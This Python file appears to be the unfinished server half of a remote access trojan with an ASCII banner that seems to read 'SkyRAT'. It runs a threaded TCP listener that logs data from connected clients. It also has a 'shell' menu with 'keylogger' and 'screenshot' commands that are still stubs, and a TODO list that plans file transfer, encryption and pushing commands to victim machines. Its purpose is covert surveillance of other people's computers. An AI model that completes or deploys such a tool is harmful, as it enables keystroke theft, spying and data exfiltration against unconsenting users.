import socket
import threading
import json
from os import getenv
from dotenv import load_dotenv
import sys

# TO DO LIST

# generalize input handling
# add file download upload
# encrypt the connection
# beautify terminal
# make it for multiple clients
# send commands to the client side to start the modules
'''
            'type': 'system_info',
            'os': platform.system(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'memory': psutil.virtual_memory().total,
            'timestamp': time.time()
'''


# Load .env    
load_dotenv()
LHOST = getenv("LHOST","localLHOST")
LPORT = getenv("LPORT","1911")
RECV_SIZE = int(getenv("RECV_SIZE","1024"))
ENCODING = str(getenv("ENCODE","utf-8"))
OUT_FILE="output.txt"
PROMPT = getenv("PROMPT","$ ")

# connection handler
def handle_client(client_socket, addr):
    print(f"\nConnection from {addr}")
    try:
        while True:
            data = client_socket.recv(RECV_SIZE)
            if not data:
                break
            message = data.decode(ENCODING)
            sys.stdout.write(f"\nReceived from {addr}: {message}\n")
            sys.stdout.flush()
    except Exception as e:
        print(f"Error with client {addr}: {e}")
    finally:
        client_socket.close()
        print(f"Connection with {addr} closed")


def out_new_line(data:str,outfile:str="output.txt"):
    with open(outfile,"a") as file:
        file.write(f"{data}\n")

# initialize server
def start_server(LPORT=LPORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        LPORT = int(LPORT)
    except ValueError:
        print("Invalid LPORT number. Please enter a valid integer.")
        return
    if LPORT < 1024:
        print("You must start the program as root to use LPORT 1024 and gold.")
        print("If the program does not work, change the LPORT number to a value greater than 1024.")
    elif LPORT > 65535:
        print("Port number must lower then 65535")
    server.bind((LHOST, LPORT))
    server.listen(5)
    sys.stdout.write(f"\nTCP Server listening on {LHOST}:{LPORT}\n")
    sys.stdout.flush()

    try:
        while True:
            client_socket, addr = server.accept()
            client_thread = threading.Thread(target=handle_client, args=(client_socket, addr))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("\nServer shutting down...")
    finally:
        server.close()

# terminal commands
def terminal(args):
    def help_command():
        print("Available commands:", ", ".join(commands.keys()))

    def keylogger_command():
        print("keylogger started")
        # will send command to the client side to start the keylogger module

    def screenshot_command():
        print("screenshot started")
        # will send command to the client side to start the screenshot module

    def exit_command():
        print("Goodbye.")
        sys.exit(0)

    commands = {
        "help": help_command,
        "keylogger": keylogger_command,
        "screenshot": screenshot_command,
        "exit": exit_command,
        "back": lambda: print("Returning to main menu..."),
    }

    command = commands.get(args)
    if command:
        command()
    else:
        print("Invalid command. Available commands:", ", ".join(commands.keys()))
                

def send_command_to_client(client_socket, command):
    try:
        client_socket.send(json.dumps(command).encode(ENCODING))
    except Exception as e:
        print(f"Failed to send command: {e}")

if __name__ == "__main__":

    print(r"""
    
    ___          ___    _  _____
  ,' _/ /7 _ __ / o | .' \/_  _/
 _\ `. //_7\V //  ,' / o / / /  
/___,'//\\  )//_/`_\/_n_/ /_/   
           //                   

Type 'shell' to start the terminal interface.
Type 'exit' to quit the server.
    """)

    # Start server listener
    listening_thread = threading.Thread(target=start_server, daemon=True)
    listening_thread.start()

    while True:
        menu_input = input()
        if menu_input == "shell":
            while True:
                # Terminal input loop
                try:
                    user_command = input(f"\n{PROMPT}")
                    if user_command == "back":
                        terminal("back")
                        break
                    terminal(user_command)
                except KeyboardInterrupt:
                    print("\n[!] Interrupted. Exiting...")
                    break
        elif menu_input == "exit":
            print("Goodbye.")
            break
